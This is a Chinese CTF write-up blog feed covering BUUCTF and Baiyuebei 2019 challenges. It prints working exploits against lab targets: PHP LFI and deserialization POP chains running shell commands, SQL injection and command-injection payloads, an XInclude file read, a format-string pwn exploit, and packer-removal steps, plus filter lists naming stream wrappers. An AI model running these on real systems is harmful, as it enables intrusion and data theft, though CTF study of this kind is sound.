class=&quot;mdl-layout-spacer&quot;&gt;&lt;/div&gt;        &lt;div&gt;      &lt;/header&gt;      &lt;div class=&quot;page-ribbon&quot;&gt;&lt;/div&gt;      &lt;main class=&quot;page-main mdl-layout__content&quot;&gt;        &lt;div class=&quot;page-container mdl-grid&quot;&gt;          &lt;div class=&quot;mdl-cell mdl-cell--2-col mdl-cell--hide-tablet mdl-cell--hide-phone&quot;&gt;&lt;/div&gt;          &lt;div class=&quot;page-content mdl-color--white mdl-shadow--4dp content mdl-color-text--grey-800 mdl-cell mdl-cell--8-col&quot;&gt;            &lt;div class=&quot;page-crumbs mdl-color-text--grey-500&quot;&gt;            &lt;/div&gt;            &lt;h3&gt;Cheer up!&lt;/h3&gt;              &lt;p&gt;                Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up!              &lt;/p&gt;              &lt;div class=&quot;page-include&quot;&gt;              &lt;?php                $file = $_GET[&#39;category&#39;];                if(isset($file))                {                    if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;)){                        include ($file . &#39;.php&#39;);                    }                    else{                        echo &quot;Sorry, we currently only support woofers and meowers.&quot;;                    }                }                ?&gt;            &lt;/div&gt;          &lt;form action=&quot;index.php&quot; method=&quot;get&quot; id=&quot;choice&quot;&gt;              &lt;center&gt;&lt;button onclick=&quot;document.getElementById(&#39;choice&#39;).submit();&quot; name=&quot;category&quot; value=&quot;woofers&quot; class=&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded=&quot;,MaterialButton,MaterialRipple&quot;&gt;Woofers&lt;span class=&quot;mdl-button__ripple-container&quot;&gt;&lt;span class=&quot;mdl-ripple is-animating&quot; style=&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/button&gt;              &lt;button onclick=&quot;document.getElementById(&#39;choice&#39;).submit();&quot; name=&quot;category&quot; value=&quot;meowers&quot; class=&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded=&quot;,MaterialButton,MaterialRipple&quot;&gt;Meowers&lt;span class=&quot;mdl-button__ripple-container&quot;&gt;&lt;span class=&quot;mdl-ripple is-animating&quot; style=&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/button&gt;&lt;/center&gt;          &lt;/form&gt;          &lt;/div&gt;        &lt;/div&gt;      &lt;/main&gt;    &lt;/div&gt;    &lt;script src=&quot;js/material.min.js&quot;&gt;&lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><p>在扫目录时发现flag.php</p><p><code>http://12d20382-ff0d-44bf-abfd-50a08a5b8604.node3.buuoj.cn/index.php?category=php://filter/read=convert.base64-encode/resource=woofers/../flag</code></p><h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><pre><code class="php">&lt;?phperror_reporting(0);if (isset($_GET[&#39;source&#39;])) {  show_source(__FILE__);  exit();}function is_valid($str) {  $banword = [    // no path traversal    &#39;\.\.&#39;,    // no stream wrapper    &#39;(php|file|glob|data|tp|zip|zlib|phar):&#39;,    // no data exfiltration    &#39;flag&#39;  ];  $regexp = &#39;/&#39; . implode(&#39;|&#39;, $banword) . &#39;/i&#39;;  if (preg_match($regexp, $str)) {    return false;  }  return true;}$body = file_get_contents(&#39;php://input&#39;);$json = json_decode($body, true);if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#39;page&#39;])) {  $page = $json[&#39;page&#39;];  $content = file_get_contents($page);  if (!$content || !is_valid($content)) {    $content = &quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;;  }} else {  $content = &#39;&lt;p&gt;invalid request&lt;/p&gt;&#39;;}// no data exfiltration!!!$content = preg_replace(&#39;/HarekazeCTF\{.+\}/i&#39;, &#39;HarekazeCTF{&amp;lt;censored&amp;gt;}&#39;, $content);echo json_encode([&#39;content&#39; =&gt; $content]);</code></pre><p>学到了学到了</p><p>json_decode在解析类似<code>\u0020</code>的时候会把他当成一个unicode字符,也就是说它会变成<code>空格</code></p><p>这个在官方文档里也有涉及<code>PHP implements a superset of JSON as specified in the original » RFC 7159.</code></p><p>去查RFC 7159就会发现</p><blockquote><pre><code>  Any character may be escaped.  If the character is in the Basic  Multilingual Plane (U+0000 through U+FFFF), then it may be  represented as a six-character sequence: a reverse solidus, followed  by the lowercase letter u, followed by four hexadecimal digits that  encode the character&#39;s code point.  The hexadecimal letters A though  F can be upper or lower case.  So, for example, a string containing  only a single reverse solidus character may be represented as  &quot;\u005C&quot;.</code></pre></blockquote><h2 id="CISCN2019-总决赛-Day1-Web4-Laravel1"><a href="#CISCN2019-总决赛-Day1-Web4-Laravel1" class="headerlink" title="[CISCN2019 总决赛 Day1 Web4]Laravel1"></a>[CISCN2019 总决赛 Day1 Web4]Laravel1</h2><pre><code class="php">&lt;?php//backup in source.tar.gznamespace App\Http\Controllers;class IndexController extends Controller{    public function index(\Illuminate\Http\Request $request){        $payload=$request-&gt;input(&quot;payload&quot;);        if(empty($payload)){            highlight_file(__FILE__);        }else{            @unserialize($payload);        }    }}</code></pre><p>很明显是要让我们找个pop链,刚开始我天真的以为可以直接用cve的,一行注释让我明白了我的天真</p><p><img src="https://i.loli.net/2020/04/16/OFIVpwyUmARvcdE.png" alt="image55205"></p><p>这个pop链显然要从<code>__destruct</code>开始</p><p><img src="https://i.loli.net/2020/04/16/qu6dkEK9UMVw2IQ.png" alt="image55300"></p><p><img src="https://i.loli.net/2020/04/16/of6Vy52wIlsvBgQ.png" alt="image55369"></p><p>在经过一番搜索+wp观看大法后,我找到了</p><p>这里有个<code>$f($items)</code>,可以直接命令执行,前提是没有直接从<code>foreach</code>那里退出</p><p>不知道为啥,本机不可以,而靶场可以???</p><pre><code class="php">&lt;?phpnamespace Symfony\Component\Cache\Adapter;class TagAwareAdapter{    private $deferred;    private $getTagsByKey;    function __construct(){        $this-&gt;deferred=&quot;cat /flag&quot;;        $this-&gt;getTagsByKey=&quot;system&quot;;    }}$a = new \Symfony\Component\Cache\Adapter\TagAwareAdapter();echo urlencode(serialize($a));</code></pre><p><code>flag{d5b22868-43a5-4784-be2f-6021702cfe89}</code></p><h2 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2><p>2333333333</p><p><code>flag{b84a1566-98fb-43aa-967d-95b86c42da14}</code></p><h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><pre><code class="php">&lt;?phpclass Modifier {    protected  $var=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;    public function append($value){        include($value);    }    public function __invoke(){        $this-&gt;append($this-&gt;var);    }}class Show{    public $source;    public $str;    public function __toString(){        return $this-&gt;str-&gt;source;    }    public function __wakeup(){        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) {            echo &quot;hacker&quot;;            $this-&gt;source = &quot;index.php&quot;;        }    }}class Test{    public $p;    public function __construct(){        $this-&gt;p = new Modifier();    }    public function __get($key){        $function = $this-&gt;p;        return $function();    }}$a=new Show();$b=new Show();$b-&gt;str=new Test();$a-&gt;source=$b;echo urlencode(serialize($a));?&gt;</code></pre><p><code>flag{ff09736d-ed1f-4089-8906-3379cbb7e019}</code></p><h2 id="GYCTF2020-Easyphp"><a href="#GYCTF2020-Easyphp" class="headerlink" title="[GYCTF2020]Easyphp"></a>[GYCTF2020]Easyphp</h2><p><code>UpdateHelper(__destruct)-&gt;User(__toString)-&gt;Info(__call)-&gt;dbCtrl(login)</code></p><pre><code class="php">&lt;?phpfunction safe($parm){    $array= array(&#39;union&#39;,&#39;regexp&#39;,&#39;load&#39;,&#39;into&#39;,&#39;flag&#39;,&#39;file&#39;,&#39;insert&#39;,&quot;&#39;&quot;,&#39;\\&#39;,&quot;*&quot;,&quot;alter&quot;);    return str_replace($array,&#39;hacker&#39;,$parm);}class User{    public $id=1;    public $age;    public $nickname;    public function __construct(){        $this-&gt;nickname=new Info();        $this-&gt;age=&quot;UPDATE user SET password=\&quot;c4ca4238a0b923820dcc509a6f75849b\&quot; where username=?&quot;;    } }class dbCtrl{    public $hostname=&quot;127.0.0.1&quot;;    public $dbuser=&quot;root&quot;;    public $dbpass=&quot;root&quot;;    public $database=&quot;test&quot;;    public $name;    public $password;    public $mysqli;    public $token;    public function __construct()    {        $this-&gt;name=&#39;admin&#39;;        $this-&gt;password=&#39;1&#39;;        $this-&gt;token=&#39;admin&#39;;    }}class Info{    public $age;    public $nickname;    public $CtrlCase;    public function __construct(){        $this-&gt;age=&quot;&quot;;        $this-&gt;nickname=&quot;&quot;;        $this-&gt;CtrlCase=new dbCtrl();    }}Class UpdateHelper{    public $id=&quot;&quot;;    public $newinfo=&quot;&quot;;    public $sql=&quot;&quot;;    public function __construct(){        $this-&gt;sql=new User();    }}$nickname=&quot;&quot;;$a=new User();$evil=str_replace(&quot;flag&quot;,&quot;alag&quot;,serialize($a));#echo $evil;$age=&#39;&quot;;s:8:&quot;nickname&quot;;&#39;.$evil.&#39;s:8:&quot;CtrlCase&quot;;N;};&#39;;$len=strlen($age);for($i=0;$i&lt;$len;$i++){    $age=&quot;union&quot;.$age;};$tmp=serialize(new Info($age,$nickname));$result=safe($tmp);echo $age;unserialize($result);?&gt;</code></pre><p><code>flag{be7c6d56-1969-47d8-8eed-e672e5496d25}</code></p><h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><pre><code>0/**/uniunionon/**/select/**/1,2,3#0/**/uniunionon/**/select/**/1,group_concat(table_name),3/**/FROM/**/information_schema.tables/**/where/**/TABLE_SCHEMA=database()#flag,score0/**/uniunionon/**/select/**/1,GROUP_CONCAT(column_name),3/**/FROM/**/information_schema.columns/**/WHERE/**/table_name=&#39;flag&#39;#flag,value </code></pre><h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><p>在robots.txt中发现fAke_f1agggg.php</p><p>在fAke_f1agggg.php中发现fl4g.php</p><pre><code class="php">&lt;img src=&quot;/img.jpg&quot;&gt;&lt;?phpheader(&#39;Content-type:text/html;charset=utf-8&#39;);error_reporting(0);highlight_file(__file__);//level 1if (isset($_GET[&#39;num&#39;])){    $num = $_GET[&#39;num&#39;];    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021){        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;;    }else{        die(&quot;金钱解决不了穷人的本质问题&quot;);    }}else{    die(&quot;去非洲吧&quot;);}//level 2if (isset($_GET[&#39;md5&#39;])){   $md5=$_GET[&#39;md5&#39;];   if ($md5==md5($md5))       echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;;   else       die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);}else{    die(&quot;去非洲吧&quot;);}//get flagif (isset($_GET[&#39;get_flag&#39;])){    $get_flag = $_GET[&#39;get_flag&#39;];    if(!strstr($get_flag,&quot; &quot;)){        $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;;        system($get_flag);    }else{        die(&quot;快到非洲了&quot;);    }}else{    die(&quot;去非洲吧&quot;);}?&gt;</code></pre><pre><code>/fl4g.php?num=1e10&amp;md5=0e215962017&amp;get_flag=a%3dc%26%26b%3da%26%26c%3dt%26%26$a$b$c%09*</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/05/05/4月做题/">https://www.ccreater.top/2020/05/05/4月做题/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 做题笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>百越杯2019</title>
      <link href="2020/04/20/byb2019/"/>
      <url>2020/04/20/byb2019/</url>
      
        <content type="html"><![CDATA[<h1 id="byb"><a href="#byb" class="headerlink" title="byb"></a>byb</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>cGxlYXNlIHN1Ym1pdDogZmxhZ3toZWxsb19ieWJ9</p><p>base64decode </p><p><code>please submit: flag{hello_byb}</code></p><h3 id="key"><a href="#key" class="headerlink" title="key"></a>key</h3><p>下载附件,用photoshop放大查看,有一条奇奇怪怪的钥匙</p><p>用hxd打开图片在图片末尾找到KEY:ISEEU!</p><p>提取钥匙中特殊颜色的RGB值与key循环异或</p><pre><code>2f3f24222e137f66247136457b7e2772331064672176670c7037237278167a60202133457b327774375c</code></pre><pre><code class="python">rgb=[&#39;2f&#39;,&#39;3f&#39;,&#39;24&#39;,&#39;22&#39;,&#39;2e&#39;,&#39;13&#39;,&#39;7f&#39;,&#39;66&#39;,&#39;24&#39;,&#39;71&#39;,&#39;36&#39;,&#39;45&#39;,&#39;7b&#39;,&#39;7e&#39;,&#39;27&#39;,&#39;72&#39;,&#39;33&#39;,&#39;10&#39;,&#39;64&#39;,&#39;67&#39;,&#39;21&#39;,&#39;76&#39;,&#39;67&#39;,&#39;0c&#39;,&#39;70&#39;,&#39;37&#39;,&#39;23&#39;,&#39;72&#39;,&#39;78&#39;,&#39;16&#39;,&#39;7a&#39;,&#39;60&#39;,&#39;20&#39;,&#39;21&#39;,&#39;33&#39; ,&#39;45&#39;,&#39;7b&#39;,&#39;32&#39;,&#39;77&#39;,&#39;74&#39;,&#39;37&#39;,&#39;5c&#39;]key=&quot;ISEEU!&quot;j=0for i in rgb:    print(chr(int(i,16)^ord(key[j])),end=&#39;&#39;)    j+=1    j%=6</code></pre><p>flag{265a4cd2-b7f1-4d32-9df7-733edfd2a21b}</p><h3 id="哈尔的移动城堡"><a href="#哈尔的移动城堡" class="headerlink" title="哈尔的移动城堡"></a>哈尔的移动城堡</h3><p>下载附件得到ori.jpg和102%</p><p>用hxd打开后发现</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t8ovhhnlj306f05nwf0.jpg" alt="image.png"></p><p>这是一张png图片但是文件头错了</p><p>划到最后面发现PK</p><p>图片里面又藏在压缩包,搜索IEND找到png的最后一个数据块(别问我为啥不用foremost,谁用谁知道)</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t8uu1b1yj30jy025jry.jpg" alt="image.png"></p><p>又是一个魔改的文件头(正常zip文件头 504B0304 ),手动分离得到zip</p><p>emmmm需要密码</p><p>用stegsolve发现分离出来的png里藏着二维码</p><p>猜测做了蒙版处理</p><p>打开ps一段猛如虎()(自闭)的操作后,手动拼接出了二维码</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t8zumovfj309o0aa0t2.jpg" alt="image.png"></p><p>得到压缩包密码1tsEz_b14ndVV4t3rM4k</p><p>解压得到两张图片</p><p>用beyondcompare得到flag</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t93pbylej30em0jjgqg.jpg" alt="image.png"></p><p>flag{3399dcb7-9e15-422f-9bf9-9db30dab70ae}</p><h3 id="wireless"><a href="#wireless" class="headerlink" title="wireless"></a>wireless</h3><p>下载得到readme和一个流量</p><p>readme</p><pre><code>已知密码格式是6666xxxx</code></pre><p>原本试着生成一个所有可打印字符的密码,但是这个也要500m+</p><p>所以先用纯数字密码试试</p><pre><code class="python">f=open(&quot;dict.txt&quot;,&quot;w&quot;)for i in range(10**4):    f.write(&quot;6666%04d\n&quot;%i)f.close()</code></pre><p>用kali的<code>aircrack-ng</code> 来破解通信内容</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t9ym6aq4j30ka0djwoh.jpg" alt="image.png"></p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t9zwgppwj30kf0e3aj3.jpg" alt="image.png"></p><p>flag{0566668912-f059-448f}</p><p>幸亏没有直接爆所有可打印字符</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><pre><code class="php">&lt;?phperror_reporting(1);class Read {    private $var;    public function file_get($value)    {        $text = base64_encode(file_get_contents($value));        return $text;    }    public function __invoke(){        $content = $this-&gt;file_get($this-&gt;var);        echo $content;    }}class Show{    public $source;    public $str;    public function __construct($file=&#39;index.php&#39;)    {        $this-&gt;source = $file;        echo $this-&gt;source.&#39;瑙ｆ瀽寮€濮�&#39;.&quot;&lt;br&gt;&quot;;    }    public function __toString()    {        $this-&gt;str[&#39;str&#39;]-&gt;source;    }    public function _show()    {        if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|fllllllaaaaaag/i&#39;,$this-&gt;source)) {            die(&#39;hacker!&#39;);        } else {            highlight_file($this-&gt;source);        }    }    public function __wakeup()    {        print(&quot;step1&quot;);        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) {            echo &quot;hacker~&quot;;            $this-&gt;source = &quot;index.php&quot;;        }    }}class Test{    public $params;    public function __construct()    {        $this-&gt;params = array();    }    public function __get($key)    {        $func = $this-&gt;params;        return $func();    }  }if(isset($_GET[&#39;chal&#39;])){    $chal = unserialize($_GET[&#39;chal&#39;]);}else{    $show = new Show(&#39;index.php&#39;);    $show-&gt;_show();}?&gt;</code></pre><p>%100反序列化链构造</p><ol><li><p><code>Show::__wake</code>是唯一可以入手的地方</p></li><li><p>在这个方法中只有$this-&gt;source可以构造pop链的连接点</p></li></ol><p>阅读代码发现<code>Show::__toString</code>会被<code>if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source))</code>调用</p><ol start="3"><li><code>Show::__toString</code>:  $this-&gt;str[‘str’]-&gt;source和<code>Test::__get</code>构成链接点</li><li><code>Test::__get</code>: <code>$func = $this-&gt;params;return $func();</code>和<code>Read::__invoke</code>构成链接点</li><li>而Read()可以任意读取文件</li></ol><p>payload生成:</p><pre><code class="php">&lt;?phpclass Show{    public $source;    public $str;    public function __construct($file=&quot;&quot;)    {    }    public function _show()    {        if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|fllllllaaaaaag/i&#39;,$this-&gt;source)) {            die(&#39;hacker!&#39;);        } else {            highlight_file($this-&gt;source);        }    }    public function __wakeup()    {    }}class Read {    private $var=&quot;fllllllaaaaaag.php&quot;;    public function file_get($value)    {        $text = base64_encode(file_get_contents($value));        return $text;    }    public function __invoke(){        $content = $this-&gt;file_get($this-&gt;var);        echo $content;    }}class Test{    public $params;    private $source=&quot;666&quot;;    public function __construct()    {    }    public function __get($key)    {        $func = $this-&gt;params;        return $func();    }  }$a=new Show();$b=new Show();$c=new Test;//$s-&gt;str[&quot;str&quot;] = $t;//Read::__invoke$c-&gt;params=new Read;//Test::__get$b-&gt;str[&#39;str&#39;]=$c;//Show::__tostring$a-&gt;source=$b;print(urlencode(serialize($a)));?&gt;</code></pre><p>最后一步就剩flag的文件名,从正则中抠出<code>fllllllaaaaaag</code>但是直接读取,网页500,是文件不存在的结果</p><p>一番尝试后flag的文件名<code>fllllllaaaaaag.php</code></p><pre><code>&lt;?php$flag = &quot;flag{df210681-fb10-4c0f-ba25-1f678eb38f85}&quot;;?&gt;</code></pre><h3 id="babygame"><a href="#babygame" class="headerlink" title="babygame"></a>babygame</h3><p>文件树</p><pre><code>index.htmltools.php?hash=manage.php?showuer            register            login            msgid=1</code></pre><p>index.html</p><p><code>&lt;!-- if you need hash tools, location: tools.php --&gt;</code></p><p>flag生成方式</p><p><code>flag{md5(name . md5(pass))}</code></p><p>网站存在两个cookie: __jsluid_h , PHPSESSID </p><p>约束攻击生效,但是无法拿到flag</p><p>二次注入测试逃逸引号</p><p>宽字节x=&gt;正常回显</p><p>%00x=&gt;\0</p><p>出现需要转义的地方没有假flag</p><p><code>a&#39;#</code>没有flag</p><p><code>a\&#39;#</code>出现flag,md5为<code>flag{md5(&quot;a\\\&#39;&quot; . md5(pass))}</code></p><p>而直接<code>b\&#39;#</code>是没有flag的,而且与#无关</p><p>判断用户时候存在再给一个flag链接</p><pre><code>a\\\&#39;#=&gt;a\&#39;#=&gt;select * from xx where user=&#39;$user&#39;?a\&#39;=&gt;a&#39;,用户不存在猜测</code></pre><p><code>c\&#39;#</code>=&gt;no flag</p><p><code>c&#39;#</code>=&gt;<code>c\&#39;#</code>出现flag(得删除cookie)</p><p>注入点就在这</p><p>什么代码导致这种结果</p><p>登陆时:<code>$_SESSION[x]=query(&quot;select * from xx where user=&#39;&quot;.mysql_real_escape($_POST[&#39;user&#39;]).&quot;&#39; and pass=&#39;&quot;.mysql_real_escape($_POST[&#39;pass&#39;])&quot;).&quot;&#39;&quot;</code></p><p><code>query(&quot;select * from xx where user=&#39;$_SESSION[x]&#39;&quot;)</code></p><pre><code>user    php($_SESSION) mysql(&#39;$sql&#39;)a&#39;        a&#39;             a&#39;a\&#39;        a\&#39;         a\&#39;</code></pre><p>存在过滤?</p><p>依据个数生成flag链接</p><p>后面想到为啥注入点不可以是msgid呢</p><p>约束攻击获得一个只带有<code>\</code>的账号</p><p>注册一个a+’ ‘*28+’”‘ 的账号</p><p>msgid处出现注入点</p><p><code>or 1%23</code>成功</p><p>用sqlmap爆破得到admin的密码拿到tools.php解密得到:<code>ChunQiuGame</code></p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8ta75axdlj30bv036jrd.jpg" alt="image.png"></p><p>正常的xxe没啥用,找到一叶飘零的一篇文章</p><p><a href="https://www.anquanke.com/post/id/156227" target="_blank" rel="noopener">https://www.anquanke.com/post/id/156227</a></p><p>payload:</p><pre><code>&lt;root xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt; &lt;xi:include href=&quot;file:///flag&quot; parse=&quot;text&quot;/&gt;&lt;/root&gt;</code></pre><p>flag{5ea7d712-e461-4d29-9246-4ea6266775a8}</p><p>………………..气死了就差一点拿到flag</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="easy-printf"><a href="#easy-printf" class="headerlink" title="easy_printf"></a>easy_printf</h3><p>pwnable.tw原题魔改，<code>bss</code>没有<code>stdin</code>,<code>stdout</code>,<code>stderr</code>了，但是一开始有个询问姓名，不知道有什么用,后来试了各种方法，想到了把<code>stdout</code>的<code>fileno</code>改为<code>2</code>，就可以绕过<code>close(1)</code>了<br>而且刚好</p><pre><code class="asm"> ► 0x40089f &lt;func1+57&gt;    mov    eax, 0   0x4008a4 &lt;func1+62&gt;    call   func2 &lt;0x4007fa&gt;   0x4008a9 &lt;func1+67&gt;    mov    eax, 0   0x4008ae &lt;func1+72&gt;    mov    rcx, qword ptr [rbp - 8]   0x4008b2 &lt;func1+76&gt;    xor    rcx, qword ptr fs:[0x28]   0x4008bb &lt;func1+85&gt;    je     func1+92 &lt;0x4008c2&gt;   0x4008bd &lt;func1+87&gt;    call   0x400648   0x4008c2 &lt;func1+92&gt;    leave     0x4008c3 &lt;func1+93&gt;    ret       0x4008c4 &lt;main&gt;        push   rbp   0x4008c5 &lt;main+1&gt;      mov    rbp, rsp───────────────────────────────────[ STACK ]────────────────────────────────────00:0000│ rsi rsp  0x7fffc9a192f0 ◂— 0x4141414141414141 (&#39;AAAAAAAA&#39;)01:0008│          0x7fffc9a192f8 —▸ 0x7fe173507690 (_IO_file_underflow+496) ◂— 0xe8df8948fffffeff02:0010│          0x7fffc9a19300 —▸ 0x7fe173852540 (_IO_2_1_stderr_) ◂— 0xfbad2087</code></pre><p>名字下面残留有<code>stderr</code>，所以读取名字时,<code>partial overwrite</code>改为<code>_IO_2_1_stdout_-&gt;_fileno</code>，然后把<code>_fileno</code>改为2即可，后面的和<code>pwnable.tw</code>没什么区别，有了泄露，也有了无限格式化字符串攻击，随便怎么玩</p><p>exp为:</p><pre><code class="python">from pwn import *def fmtstr(offset, addr, data, written):    cnt = 0    payload = &#39;&#39;    address = &#39;&#39;    for x in data:        cur = ord(x)        if cur &gt;= written&amp;0xff:            to_add = cur - (written&amp;0xff)        else:            to_add = 0x100 + cur - (written&amp;0xff)        round = &#39;&#39;        if to_add != 0:            round += &quot;%{}c&quot;.format(to_add)        round += &quot;%{}$hhn&quot;.format(offset+cnt+len(data)*2)        assert(len(round) &lt;= 0x10)        written += to_add + 0x10 - len(round)        payload += round.ljust(0x10, &#39;_&#39;)        address += p64(addr+cnt)        cnt+=1    return payload + addressdef main(host,port=12001):    if host:        p = remote(host,port)    else:        # p = process(&quot;./easy_printf&quot;,env={&quot;LD_PRELOAD&quot;:&quot;./libc.so&quot;})        p = process(&quot;./easy_printf&quot;)        gdb.attach(p,&quot;b *0x000000000400846&quot;)    p.recvuntil(&quot;write down your name&quot;)    # t = raw_input(&#39;guess: &#39;)    t = 0x7    stdout_fileno = (int(t) &lt;&lt; 12) | 0x690    p.send(&quot;A&quot;*0x10+p16(stdout_fileno))    pause()    buf_addr = 0x601060    payload =  &quot;%{}c%28$hhn%{}c%58$hn&quot;.format(2,0x2a6).ljust(0x18,&#39;_&#39;)    payload += fmtstr(9,buf_addr,p64(0x000000000400814)[:3],0x2ab)    p.send(payload)    pause()    payload =  &quot;%{}c%23$hhn%35$p-%36$p^%37$p-%38$p-%39$p*%40$p-&quot;.format(0x14)    p.send(payload)    pause()    p.recvuntil(&quot;^&quot;)    stack = int(p.recvuntil(&#39;-&#39;,drop=True),16)    p.recvuntil(&quot;*&quot;)    libc.address = int(p.recvuntil(&#39;-&#39;,drop=True),16)-0x20837    info(&quot;stack : &quot; + hex(stack))    info(&quot;libc : &quot; + hex(libc.address))    onegadget = 0xf1147+libc.address    ret_addr = stack - 0x1e8    payload =  &quot;%{}c%23$hhn&quot;.format(0x14).ljust(0x10,&#39;_&#39;)    payload += fmtstr(15,ret_addr,p64(onegadget)[:2],0x19)    p.send(payload)    pause()    # :0000000000400865                 retn    offset = 13    payload =  &quot;%{}c%16$hhn%{}c%17$hn&quot;.format(ord(p64(onegadget)[2:3]),0x865-ord(p64(onegadget)[2:3])).ljust(0x18,&#39;_&#39;)    payload += p64(ret_addr+2)+p64(ret_addr-8)    payload = payload.ljust(0x80,&quot;\x00&quot;)    p.send(payload)    p.interactive()if __name__ == &quot;__main__&quot;:    libc = ELF(&quot;./libc.so&quot;,checksec=False)    main(args[&#39;REMOTE&#39;])</code></pre><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="bwarm"><a href="#bwarm" class="headerlink" title="bwarm"></a>bwarm</h3><p>首先，还是查壳，没啥说的 vmp2.0.7</p><p> 根据vmp系列脱壳教程，这个壳是1.8以上的方案进行脱壳。先拖入OD，下一个API断点  VirtualProtect (教程建议是下硬件断点，可能是我的OD有问题，硬件断点断不下来，只能是F2断点了 T_T)</p><p>然后F9开始跑，测试到第5次跑飞……</p><p>那么就在第四次的时开始候单步跟踪，先跳出VirtualProtect 函数 ，然后对代码段设置，内存访问断点</p><p>然后F9继续运行，断下来后，在ESP的地方跟踪内存数据，找到SEH结构化异常的上面35C地址那块，下一个硬件写入断点，并取消之前的内存访问断点</p><p>然后继续F9运行，再次断下来，这次再在代码断下内存访问断点，然后多次F9运行，注意观察栈帧的变化，快到SEH的地方就接近OEP了，此时已经跟踪到解压后的代码段，然后进行一下代码分析。</p><p>完成分析后，代码就还原了，然后单步跟踪，发现OEP </p><p>发现OEP后，同时我们也注意到栈帧部分被压入了3条数据，这个就是VMP偷取的代码，我们需要进行还原，于是在当前位置查找一段 0000000000的内存段</p><p>然后，对VMP偷取的代码进行patch。最后跳转到OEP 也就是 jmp 012319C9</p><p>接着我们把当前的 01231FB5 设置为新的EIP，就可以进行dump内存操作了，填好起始地址和入口地址后，点击脱壳</p><p>把脱壳的文件保存为 dump.exe 然后尝试运行，发现不能运行，直接崩溃掉了</p><p>于是猜到可能是重定向表的问题造成，用PE编辑器修改一下这里，然后保存。</p><p>再次运行，OK 